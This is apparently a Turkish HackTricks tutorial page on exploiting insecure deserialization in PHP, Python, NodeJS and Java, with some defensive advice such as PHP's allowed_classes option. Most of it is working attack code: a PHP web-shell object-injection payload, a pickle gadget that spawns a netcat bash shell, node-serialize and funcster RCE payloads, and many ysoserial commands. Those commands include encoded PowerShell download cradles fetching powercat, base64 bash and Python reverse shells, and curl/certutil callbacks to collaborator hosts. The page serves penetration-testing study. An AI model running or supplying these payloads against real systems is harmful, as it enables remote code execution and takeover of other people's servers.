# Deserialization

{{#include ../../banners/hacktricks-training.md}}

## Temel Bilgiler

**Serialization**, bir nesneyi saklanabilir bir formata dönüştürme yöntemi olarak anlaşılır; bu, nesneyi depolama veya bir iletişim sürecinin parçası olarak iletme amacı taşır. Bu teknik, nesnenin daha sonra yeniden oluşturulabilmesini sağlamak için yaygın olarak kullanılır ve yapısını ve durumunu korur.

**Deserialization** ise, tersine, serileştirmeyi etkisiz hale getiren bir süreçtir. Belirli bir formatta yapılandırılmış verileri alıp, tekrar bir nesne haline getirmeyi içerir.

Deserialization tehlikeli olabilir çünkü potansiyel olarak **saldırganların serileştirilmiş verileri manipüle ederek zararlı kod çalıştırmasına** veya nesne yeniden yapılandırma sürecinde uygulamada beklenmedik davranışlar oluşturmasına olanak tanır.

## PHP

PHP'de, serileştirme ve deserialization süreçlerinde belirli sihirli yöntemler kullanılır:

- `__sleep`: Bir nesne serileştirilirken çağrılır. Bu yöntem, serileştirilmesi gereken nesnenin tüm özelliklerinin adlarını içeren bir dizi döndürmelidir. Genellikle bekleyen verileri taahhüt etmek veya benzer temizlik görevlerini yerine getirmek için kullanılır.
- `__wakeup`: Bir nesne deserialized edilirken çağrılır. Serileştirme sırasında kaybolmuş olabilecek veritabanı bağlantılarını yeniden kurmak ve diğer yeniden başlatma görevlerini yerine getirmek için kullanılır.
- `__unserialize`: Bu yöntem, bir nesne deserialized edilirken `__wakeup` yerine çağrılır (varsa). Deserialization süreci üzerinde `__wakeup`'a kıyasla daha fazla kontrol sağlar.
- `__destruct`: Bu yöntem, bir nesne yok edilmek üzereyken veya script sona erdiğinde çağrılır. Genellikle dosya tanıtıcılarını veya veritabanı bağlantılarını kapatmak gibi temizlik görevleri için kullanılır.
- `__toString`: Bu yöntem, bir nesnenin bir string olarak muamele görmesini sağlar. Bir dosyayı okumak veya içindeki fonksiyon çağrılarına dayalı diğer görevler için kullanılabilir ve nesnenin metinsel bir temsilini etkili bir şekilde sağlar.
```php
<?php
class test {
public $s = "This is a test";
public function displaystring(){
echo $this->s.'<br />';
}
public function __toString()
{
echo '__toString method called';
}
public function __construct(){
echo "__construct method called";
}
public function __destruct(){
echo "__destruct method called";
}
public function __wakeup(){
echo "__wakeup method called";
}
public function __sleep(){
echo "__sleep method called";
return array("s"); #The "s" makes references to the public attribute
}
}

$o = new test();
$o->displaystring();
$ser=serialize($o);
echo $ser;
$unser=unserialize($ser);
$unser->displaystring();

/*
php > $o = new test();
__construct method called
__destruct method called
php > $o->displaystring();
This is a test<br />

php > $ser=serialize($o);
__sleep method called

php > echo $ser;
O:4:"test":1:{s:1:"s";s:14:"This is a test";}

php > $unser=unserialize($ser);
__wakeup method called
__destruct method called

php > $unser->displaystring();
This is a test<br />
*/
?>
```
Eğer sonuçlara bakarsanız, nesne serileştirildiğinde **`__wakeup`** ve **`__destruct`** fonksiyonlarının çağrıldığını görebilirsiniz. Birçok eğitimde **`__toString`** fonksiyonunun bazı özellikleri yazdırmaya çalışırken çağrıldığını göreceksiniz, ancak görünüşe göre bu **artık olmuyor**.

> [!WARNING]
> Eğer sınıfta uygulanmışsa, **`__unserialize(array $data)`** metodu **`__wakeup()`** yerine çağrılır. Bu, serileştirilmiş veriyi bir dizi olarak sağlayarak nesneyi serileştirmeye olanak tanır. Bu metodu, özellikleri serileştirmek ve serileştirme sırasında gerekli görevleri yerine getirmek için kullanabilirsiniz.
>
> ```php
> class MyClass {
>    private $property;
>
>    public function __unserialize(array $data): void {
>        $this->property = $data['property'];
>        // Serileştirme sırasında gerekli görevleri yerine getirin.
>    }
> }
> ```

Açıklamalı bir **PHP örneğini burada** okuyabilirsiniz: [https://www.notsosecure.com/remote-code-execution-via-php-unserialize/](https://www.notsosecure.com/remote-code-execution-via-php-unserialize/), burada [https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf](https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf) veya burada [https://securitycafe.ro/2015/01/05/understanding-php-object-injection/](https://securitycafe.ro/2015/01/05/understanding-php-object-injection/)

### PHP Deserial + Autoload Classes

PHP otomatik yükleme işlevselliğini, keyfi php dosyalarını yüklemek ve daha fazlası için kötüye kullanabilirsiniz:

{{#ref}}
php-deserialization-+-autoload-classes.md
{{#endref}}

### Referans Değerleri Serileştirme

Herhangi bir nedenle bir değeri **başka bir serileştirilmiş değere referans olarak** serileştirmek isterseniz:
```php
<?php
class AClass {
public $param1;
public $param2;
}

$o = new WeirdGreeting;
$o->param1 =& $o->param22;
$o->param = "PARAM";
$ser=serialize($o);
```
### `allowed_classes` ile PHP Nesne Enjeksiyonunu Önleme

> [!INFO]
> `unserialize()` fonksiyonunun **ikinci argümanı** ( `$options` dizisi) **PHP 7.0**'da eklendi. Daha eski sürümlerde fonksiyon yalnızca serileştirilmiş dizeyi kabul eder, bu da hangi sınıfların örnekleneceğini kısıtlamayı imkansız hale getirir.

`unserialize()` serileştirilmiş akışta bulduğu **her sınıfı** örnekleyecektir, aksi belirtilmedikçe. PHP 7'den itibaren davranış [`allowed_classes`](https://www.php.net/manual/en/function.unserialize.php) seçeneği ile kısıtlanabilir:
```php
// NEVER DO THIS – full object instantiation
$object = unserialize($userControlledData);

// SAFER – disable object instantiation completely
$object = unserialize($userControlledData, [
'allowed_classes' => false    // no classes may be created
]);

// Granular – only allow a strict white-list of models
$object = unserialize($userControlledData, [
'allowed_classes' => [MyModel::class, DateTime::class]
]);
```
Eğer **`allowed_classes` belirtilmemişse _veya_ kod PHP < 7.0 üzerinde çalışıyorsa**, çağrı **tehlikeli** hale gelir çünkü bir saldırgan, Uzak Kod Yürütme (RCE) elde etmek için `__wakeup()` veya `__destruct()` gibi sihirli yöntemleri istismar eden bir yük oluşturabilir.

#### Gerçek dünya örneği: Everest Forms (WordPress) CVE-2025-52709

WordPress eklentisi **Everest Forms ≤ 3.2.2**, bir yardımcı sarmalayıcı ile savunmacı olmaya çalıştı ancak eski PHP sürümlerini unuttu:
```php
function evf_maybe_unserialize($data, $options = array()) {
if (is_serialized($data)) {
if (version_compare(PHP_VERSION, '7.1.0', '>=')) {
// SAFE branch (PHP ≥ 7.1)
$options = wp_parse_args($options, array('allowed_classes' => false));
return @unserialize(trim($data), $options);
}
// DANGEROUS branch (PHP < 7.1)
return @unserialize(trim($data));
}
return $data;
}
```
**PHP ≤ 7.0** çalışan sunucularda bu ikinci dal, bir yöneticinin kötü niyetli bir form gönderimini açması durumunda klasik bir **PHP Nesne Enjeksiyonu** ile sonuçlandı. Minimal bir istismar yükü şöyle görünebilir:
```
O:8:"SomeClass":1:{s:8:"property";s:28:"<?php system($_GET['cmd']); ?>";}
```
Yönetici girişi görüntülediği anda, nesne oluşturuldu ve `SomeClass::__destruct()` çalıştırıldı, bu da rastgele kod yürütülmesine yol açtı.

**Önemli Noktalar**
1. `unserialize()` çağrılırken her zaman `['allowed_classes' => false]` (veya katı bir beyaz liste) geçirin.
2. Savunma sarmalayıcılarını denetleyin – genellikle eski PHP dallarını unutur.
3. Sadece **PHP ≥ 7.x**'ye yükseltmek *yeterli değildir*: seçenek hala açıkça sağlanmalıdır.

---

### PHPGGC (PHP için ysoserial)

[**PHPGGC**](https://github.com/ambionics/phpggc), PHP deserialization'larını kötüye kullanmak için yükler oluşturmanıza yardımcı olabilir.\
Uygulamanın kaynak kodunda bir deserialization'ı kötüye kullanmanın bir yolunu **bulamayabileceğinizi** unutmayın, ancak **harici PHP uzantılarının kodunu kötüye kullanabilirsiniz.**\
Bu nedenle, mümkünse, sunucunun `phpinfo()`'sunu kontrol edin ve **internette** (hatta **PHPGGC**'nin **gadgets**'lerinde) kötüye kullanabileceğiniz bazı olası gadget'ları arayın.

### phar:// metadata deserialization

Eğer sadece dosyayı okuyan ve içindeki php kodunu çalıştırmayan bir LFI bulduysanız, örneğin _**file_get_contents(), fopen(), file() veya file_exists(), md5_file(), filemtime() veya filesize()**_** gibi fonksiyonlar kullanarak.** **phar** protokolünü kullanarak bir **dosya** okurken meydana gelen bir **deserialization**'ı kötüye kullanmayı deneyebilirsiniz.\
Daha fazla bilgi için aşağıdaki gönderiyi okuyun:

{{#ref}}
../file-inclusion/phar-deserialization.md
{{#endref}}

## Python

### **Pickle**

Nesne unpickle edildiğinde, \_\_\_reduce\_\_\_ fonksiyonu çalıştırılacaktır.\
Kötüye kullanıldığında, sunucu bir hata döndürebilir.
```python
import pickle, os, base64
class P(object):
def __reduce__(self):
return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
print(base64.b64encode(pickle.dumps(P())))
```
Önce bypass tekniğini kontrol etmeden önce, python3 çalıştırıyorsanız `print(base64.b64encode(pickle.dumps(P(),2)))` kullanarak python2 ile uyumlu bir nesne oluşturmayı deneyin.

**pickle jails**'dan kaçış hakkında daha fazla bilgi için kontrol edin:

{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

### Yaml **&** jsonpickle

Aşağıdaki sayfa, **yamls** python kütüphanelerinde **güvensiz bir deserialization'ı kötüye kullanma** tekniğini sunmakta ve **Pickle, PyYAML, jsonpickle ve ruamel.yaml** için RCE deserialization yükü oluşturmak üzere kullanılabilecek bir araçla bitmektedir:

{{#ref}}
python-yaml-deserialization.md
{{#endref}}

### Class Pollution (Python Prototype Pollution)

{{#ref}}
../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md
{{#endref}}

## NodeJS

### JS Magic Functions

JS **PHP veya Python gibi "sihirli" fonksiyonlara** sahip değildir; bu fonksiyonlar yalnızca bir nesne oluşturmak için çalıştırılacaktır. Ancak, **doğrudan çağrılmadan** bile **sıklıkla kullanılan bazı fonksiyonlar** vardır, örneğin **`toString`**, **`valueOf`**, **`toJSON`**.\
Eğer bir deserialization'ı kötüye kullanıyorsanız, bu fonksiyonları **diğer kodları çalıştırmak için tehlikeye atabilirsiniz** (potansiyel olarak prototype kirliliğini kötüye kullanarak) ve çağrıldıklarında rastgele kod çalıştırabilirsiniz.

Bir fonksiyonu doğrudan çağırmadan **"sihirli" bir şekilde çağırmanın** bir diğer yolu, **bir async fonksiyondan dönen bir nesneyi tehlikeye atmaktır** (promise). Çünkü, eğer o **dönüş nesnesini** **"then" adında bir fonksiyon türünde bir **özellik** ile başka bir **promise**'e **dönüştürürseniz**, başka bir promise tarafından döndürüldüğü için **çalıştırılacaktır**. _Daha fazla bilgi için_ [_**bu bağlantıyı**_](https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/) _takip edin._
```javascript
// If you can compromise p (returned object) to be a promise
// it will be executed just because it's the return object of an async function:
async function test_resolve() {
const p = new Promise((resolve) => {
console.log("hello")
resolve()
})
return p
}

async function test_then() {
const p = new Promise((then) => {
console.log("hello")
return 1
})
return p
}

test_ressolve()
test_then()
//For more info: https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/
```
### `__proto__` ve `prototype` kirlenmesi

Bu tekniği öğrenmek istiyorsanız **aşağıdaki eğitime göz atın**:


{{#ref}}
nodejs-proto-prototype-pollution/
{{#endref}}

### [node-serialize](https://www.npmjs.com/package/node-serialize)

Bu kütüphane fonksiyonları serileştirmeye olanak tanır. Örnek:
```javascript
var y = {
rce: function () {
require("child_process").exec("ls /", function (error, stdout, stderr) {
console.log(stdout)
})
},
}
var serialize = require("node-serialize")
var payload_serialized = serialize.serialize(y)
console.log("Serialized: \n" + payload_serialized)
```
**Serileştirilmiş nesne** şöyle görünecektir:
```bash
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}"}
```
Örnekte görebileceğiniz gibi, bir fonksiyon serileştirildiğinde `_$$ND_FUNC$$_` bayrağı serileştirilmiş nesneye eklenir.

`node-serialize/lib/serialize.js` dosyasında aynı bayrağı ve kodun bunu nasıl kullandığını bulabilirsiniz.

![](<../../images/image (351).png>)

![](<../../images/image (446).png>)

Son kod parçasında görebileceğiniz gibi, **eğer bayrak bulunursa** `eval` fonksiyonu kullanılarak fonksiyon serileştirilir, bu nedenle temelde **kullanıcı girişi `eval` fonksiyonu içinde kullanılmaktadır**.

Ancak, **sadece bir fonksiyonu serileştirmek** **onu çalıştırmaz**, çünkü kodun bir kısmının **`y.rce`'yi çağırması** gerekir ve bu oldukça **olasılık dışıdır**.\
Yine de, serileştirilmiş nesneyi **değiştirerek** **bazı parantezler ekleyerek** nesne serileştirildiğinde serileştirilmiş fonksiyonun otomatik olarak çalışmasını sağlayabilirsiniz.\
Son kod parçasında **son parantezi** ve `unserialize` fonksiyonunun kodu otomatik olarak nasıl çalıştıracağını gözlemleyin:
```javascript
var serialize = require("node-serialize")
var test = {
rce: "_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()",
}
serialize.unserialize(test)
```
Daha önce belirtildiği gibi, bu kütüphane `_$$ND_FUNC$$_` sonrasındaki kodu alacak ve **çalıştıracak** `eval` kullanarak. Bu nedenle, **otomatik olarak kod çalıştırmak** için **fonksiyon oluşturma** kısmını ve son parantezi **silip sadece bir JS tek satır** çalıştırabilirsiniz, aşağıdaki örnekteki gibi:
```javascript
var serialize = require("node-serialize")
var test =
"{\"rce\":\"_$$ND_FUNC$$_require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })\"}"
serialize.unserialize(test)
```
Bu güvenlik açığını nasıl istismar edeceğinize dair **daha fazla bilgiye** [**buradan**](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/) ulaşabilirsiniz.

### [funcster](https://www.npmjs.com/package/funcster)

**funcster**'ın dikkate değer bir yönü, **standart yerleşik nesnelerin** erişilemezliğidir; bunlar erişilebilir kapsamın dışındadır. Bu kısıtlama, yerleşik nesneler üzerinde yöntem çağırmaya çalışan kodların çalıştırılmasını engeller ve `console.log()` veya `require(something)` gibi komutlar kullanıldığında `"ReferenceError: console is not defined"` gibi istisnalara yol açar.

Bu sınırlamaya rağmen, belirli bir yaklaşım aracılığıyla, tüm standart yerleşik nesneler dahil olmak üzere küresel bağlama tam erişimin geri kazanılması mümkündür. Küresel bağlamı doğrudan kullanarak, bu kısıtlamayı aşmak mümkündür. Örneğin, aşağıdaki kod parçası kullanılarak erişim yeniden sağlanabilir:
```javascript
funcster = require("funcster")
//Serialization
var test = funcster.serialize(function () {
return "Hello world!"
})
console.log(test) // { __js_function: 'function(){return"Hello world!"}' }

//Deserialization with auto-execution
var desertest1 = { __js_function: 'function(){return "Hello world!"}()' }
funcster.deepDeserialize(desertest1)
var desertest2 = {
__js_function: 'this.constructor.constructor("console.log(1111)")()',
}
funcster.deepDeserialize(desertest2)
var desertest3 = {
__js_function:
"this.constructor.constructor(\"require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });\")()",
}
funcster.deepDeserialize(desertest3)
```
**Daha fazla bilgi için bu kaynağı okuyun**[ **source**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### [**serialize-javascript**](https://www.npmjs.com/package/serialize-javascript)

**serialize-javascript** paketi yalnızca serileştirme amaçları için tasarlanmıştır ve yerleşik bir deserialization yeteneği yoktur. Kullanıcılar, deserialization için kendi yöntemlerini uygulamaktan sorumludur. Resmi örnek, serileştirilmiş verileri deserialization için `eval` kullanımını önermektedir:
```javascript
function deserialize(serializedJavascript) {
return eval("(" + serializedJavascript + ")")
}
```
Bu fonksiyon nesneleri serileştirmek için kullanılıyorsa, **kolayca istismar edebilirsiniz**:
```javascript
var serialize = require("serialize-javascript")
//Serialization
var test = serialize(function () {
return "Hello world!"
})
console.log(test) //function() { return "Hello world!" }

//Deserialization
var test =
"function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"
deserialize(test)
```
**Daha fazla bilgi için bu kaynağı okuyun**[ **.**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### Cryo kütüphanesi

Aşağıdaki sayfalarda, bu kütüphaneyi kötüye kullanarak rastgele komutları nasıl çalıştırabileceğinize dair bilgiler bulabilirsiniz:

- [https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)
- [https://hackerone.com/reports/350418](https://hackerone.com/reports/350418)

## Java - HTTP

Java'da, **deserialization geri çağırmaları deserialization süreci sırasında çalıştırılır**. Bu yürütme, bu geri çağırmaları tetikleyen kötü niyetli yükler oluşturan saldırganlar tarafından istismar edilebilir ve potansiyel olarak zararlı eylemlerin gerçekleştirilmesine yol açabilir.

### Parmak İzleri

#### Beyaz Kutu

Kod tabanında potansiyel serileştirme zafiyetlerini tanımlamak için arayın:

- `Serializable` arayüzünü uygulayan sınıflar.
- `java.io.ObjectInputStream`, `readObject`, `readUnshare` fonksiyonlarının kullanımı.

Aşağıdakilere ekstra dikkat edin:

- Dış kullanıcılar tarafından tanımlanan parametrelerle kullanılan `XMLDecoder`.
- `XStream`'in `fromXML` metodu, özellikle XStream sürümü 1.46 veya daha düşükse, serileştirme sorunlarına karşı hassastır.
- `readObject` metodu ile birlikte kullanılan `ObjectInputStream`.
- `readObject`, `readObjectNodData`, `readResolve` veya `readExternal` gibi yöntemlerin uygulanması.
- `ObjectInputStream.readUnshared`.
- Genel `Serializable` kullanımı.

#### Siyah Kutu

Siyah kutu testleri için, java serileştirilmiş nesnelerini belirten belirli **imzalar veya "Sihirli Baytlar"** arayın ( `ObjectInputStream`'den kaynaklanan):

- Onaltılık desen: `AC ED 00 05`.
- Base64 deseni: `rO0`.
- `Content-type` başlığı `application/x-java-serialized-object` olarak ayarlanmış HTTP yanıt başlıkları.
- Önceki sıkıştırmayı belirten onaltılık desen: `1F 8B 08 00`.
- Önceki sıkıştırmayı belirten Base64 deseni: `H4sIA`.
- `.faces` uzantısına sahip web dosyaları ve `faces.ViewState` parametresi. Bu desenleri bir web uygulamasında keşfetmek, [Java JSF ViewState Deserialization](java-jsf-viewstate-.faces-deserialization.md) hakkında detaylı bir inceleme yapılmasını gerektirmelidir.
```
javax.faces.ViewState=rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s
```
### Açık olup olmadığını kontrol et

Eğer **Java Deserialized bir açığın nasıl çalıştığını öğrenmek** istiyorsanız, [**Basic Java Deserialization**](basic-java-deserialization-objectinputstream-readobject.md), [**Java DNS Deserialization**](java-dns-deserialization-and-gadgetprobe.md) ve [**CommonsCollection1 Payload**](java-transformers-to-rutime-exec-payload.md) belgelerine göz atmalısınız.

#### Beyaz Kutu Testi

Bilinen güvenlik açıklarına sahip herhangi bir uygulamanın kurulu olup olmadığını kontrol edebilirsiniz.
```bash
find . -iname "*commons*collection*"
grep -R InvokeTransformer .
```
Tüm bilinen zayıf kütüphaneleri **kontrol etmeyi** deneyebilirsiniz ve [**Ysoserial**](https://github.com/frohoff/ysoserial) bunun için bir istismar sağlayabilir. Ya da [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json) üzerinde belirtilen kütüphaneleri kontrol edebilirsiniz.\
Ayrıca, olası istismar edilebilecek gadget zincirlerini aramak için [**gadgetinspector**](https://github.com/JackOfMostTrades/gadgetinspector) kullanabilirsiniz.\
**gadgetinspector**'ı çalıştırırken (inşa ettikten sonra) karşılaştığı tonlarca uyarı/hata ile ilgilenmeyin ve bitirmesine izin verin. Tüm bulguları _gadgetinspector/gadget-results/gadget-chains-year-month-day-hore-min.txt_ altında yazacaktır. Lütfen, **gadgetinspector'ın bir istismar oluşturmayacağını ve yanlış pozitifler gösterebileceğini** unutmayın.

#### Kara Kutu Testi

Burp uzantısı [**gadgetprobe**](java-dns-deserialization-and-gadgetprobe.md) kullanarak **hangi kütüphanelerin mevcut olduğunu** (ve hatta sürümlerini) belirleyebilirsiniz. Bu bilgi ile, zayıflığı istismar etmek için **bir yük seçmek daha kolay olabilir**.\
[**GadgetProbe hakkında daha fazla bilgi için bunu okuyun.**](java-dns-deserialization-and-gadgetprobe.md#gadgetprobe)**.**\
GadgetProbe, **`ObjectInputStream` deserialization**'larına odaklanmıştır.

Burp uzantısı [**Java Deserialization Scanner**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner) kullanarak **ysoserial ile istismar edilebilen zayıf kütüphaneleri** belirleyebilir ve **istismar** edebilirsiniz.\
[**Java Deserialization Scanner hakkında daha fazla bilgi için bunu okuyun.**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner)\
Java Deserialization Scanner, **`ObjectInputStream`** deserialization'larına odaklanmıştır.

Ayrıca, **Burp** içinde **deserialization** zayıflıklarını **tespit etmek için** [**Freddy**](https://github.com/nccgroup/freddy) kullanabilirsiniz. Bu eklenti, **sadece `ObjectInputStream`** ile ilgili zayıflıkları değil, **Json** ve **Yml** deserialization kütüphanelerinden de zayıflıkları tespit edecektir. Aktif modda, bunları uyku veya DNS yükleri kullanarak doğrulamaya çalışacaktır.\
[**Freddy hakkında daha fazla bilgi burada bulabilirsiniz.**](https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2018/june/finding-deserialisation-issues-has-never-been-easier-freddy-the-serialisation-killer/)

**Serileştirme Testi**

Sunucu tarafından kullanılan herhangi bir zayıf kütüphaneyi kontrol etmekle ilgili her şey değil. Bazen, **serileştirilmiş nesne içindeki verileri değiştirebilir ve bazı kontrolleri atlayabilirsiniz** (belki bir web uygulaması içinde size yönetici ayrıcalıkları verebilir).\
Bir web uygulamasına gönderilen bir java serileştirilmiş nesnesi bulursanız, **gönderilen serileştirme nesnesini daha okunabilir bir formatta yazdırmak için** [**SerializationDumper**](https://github.com/NickstaDB/SerializationDumper) **kullanabilirsiniz**. Hangi verileri gönderdiğinizi bilmek, bunları değiştirmeyi ve bazı kontrolleri atlamayı kolaylaştıracaktır.

### **İstismar**

#### **ysoserial**

Java deserialization'larını istismar etmek için ana araç [**ysoserial**](https://github.com/frohoff/ysoserial) ([**buradan indirin**](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)). Ayrıca, karmaşık komutlar (örneğin, borular ile) kullanmanıza olanak tanıyacak [**ysoseral-modified**](https://github.com/pimps/ysoserial-modified) kullanmayı da düşünebilirsiniz.\
Bu aracın **`ObjectInputStream`** istismarına **odaklandığını** unutmayın.\
İnsanı **RCE** yükünden önce **"URLDNS"** yükünü kullanmaya **başlamanızı** öneririm, böylece enjeksiyonun mümkün olup olmadığını test edebilirsiniz. Her durumda, "URLDNS" yükünün çalışmadığını ancak başka bir RCE yükünün çalıştığını unutmayın.
```bash
# PoC to make the application perform a DNS req
java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://b7j40108s43ysmdpplgd3b7rdij87x.burpcollaborator.net > payload

# PoC RCE in Windows
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'cmd /c ping -n 5 127.0.0.1' > payload
# Time, I noticed the response too longer when this was used
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c timeout 5" > payload
# Create File
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c echo pwned> C:\\\\Users\\\\username\\\\pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c nslookup jvikwa34jwgftvoxdz16jhpufllb90.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c certutil -urlcache -split -f http://j4ops7g6mi9w30verckjrk26txzqnf.burpcollaborator.net/a a"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAYwBlADcAMABwAG8AbwB1ADAAaABlAGIAaQAzAHcAegB1AHMAMQB6ADIAYQBvADEAZgA3ADkAdgB5AC4AYgB1AHIAcABjAG8AbABsAGEAYgBvAHIAYQB0AG8AcgAuAG4AZQB0AC8AYQAnACkA"
## In the ast http request was encoded: IEX(New-Object Net.WebClient).downloadString('http://1ce70poou0hebi3wzus1z2ao1f79vy.burpcollaborator.net/a')
## To encode something in Base64 for Windows PS from linux you can use: echo -n "<PAYLOAD>" | iconv --to-code UTF-16LE | base64 -w0
# Reverse Shell
## Encoded: IEX(New-Object Net.WebClient).downloadString('http://192.168.1.4:8989/powercat.ps1')
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA6ADgAOQA4ADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA"

#PoC RCE in Linux
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "ping -c 5 192.168.1.4" > payload
# Time
## Using time in bash I didn't notice any difference in the timing of the response
# Create file
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "touch /tmp/pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "dig ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "nslookup ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "curl ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net" > payload
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "wget ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# Reverse shell
## Encoded: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" | base64 -w0
## Encoded: export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,ZXhwb3J0IFJIT1NUPSIxMjcuMC4wLjEiO2V4cG9ydCBSUE9SVD0xMjM0NTtweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=}|{base64,-d}|{bash,-i}"

# Base64 encode payload in base64
base64 -w0 payload
```
Bir **java.lang.Runtime.exec()** yükü oluştururken, bir yürütmenin çıktısını yönlendirmek için ">" veya "|" gibi **özel karakterler** kullanamazsınız, komutları yürütmek için "$()" kullanamazsınız veya bir komuta **boşluklarla** ayrılmış **argümanlar** bile geçiremezsiniz ( `echo -n "hello world"` yapabilirsiniz ama `python2 -c 'print "Hello world"'` yapamazsınız). Yükü doğru bir şekilde kodlamak için [bu web sayfasını](http://www.jackson-t.ca/runtime-exec-payloads.html) kullanabilirsiniz.

Windows ve Linux için **tüm olası kod yürütme** yüklerini oluşturmak ve ardından bunları savunmasız web sayfasında test etmek için aşağıdaki betiği kullanmaktan çekinmeyin:
```python
import os
import base64

# You may need to update the payloads
payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'Vaadin1', 'Wicket1']
def generate(name, cmd):
for payload in payloads:
final = cmd.replace('REPLACE', payload)
print 'Generating ' + payload + ' for ' + name + '...'
command = os.popen('java -jar ysoserial.jar ' + payload + ' "' + final + '"')
result = command.read()
command.close()
encoded = base64.b64encode(result)
if encoded != "":
open(name + '_intruder.txt', 'a').write(encoded + '\n')

generate('Windows', 'ping -n 1 win.REPLACE.server.local')
generate('Linux', 'ping -c 1 nix.REPLACE.server.local')
```
#### serialkillerbypassgadgets

